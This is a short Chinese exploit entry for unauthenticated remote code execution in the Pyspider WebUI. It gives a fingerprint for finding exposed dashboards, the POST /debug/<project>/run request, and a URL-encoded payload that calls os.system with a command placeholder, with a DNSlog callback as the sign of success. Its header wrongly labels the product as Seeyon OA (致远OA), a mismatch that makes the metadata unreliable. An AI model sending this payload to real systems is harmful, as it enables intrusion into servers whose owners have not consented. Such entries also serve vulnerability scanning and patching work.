# PyspiderWebUI未授权访问致远程代码执行漏洞

致远OA ｜ 命令执行 ｜ —
- **指纹**：`title="Dashboard - pyspider"`
- **请求**：`POST /debug/任意实例名/run HTTP/1.1`

**Payload**
```
webdav_mode=false&script=import+os%0D%0A%0D%0Aprint%28os.system%28%27执行的命令%27%29%29&task=%7B%0A++%22process%22%3A+%7B%0A++++%22callback%22%3A+%22on_start%22%0A++%7D%2C%0A++%22project%22%3A+%22pyspidervulntest%22%2C%0A++%22taskid%22%3A+%22data%3A%2Con_start%22%2C%0A++%22url%22%3A+%22data%3A%2Con_start%22%0A%7D
```
- **响应特征**：200 DNSlog回显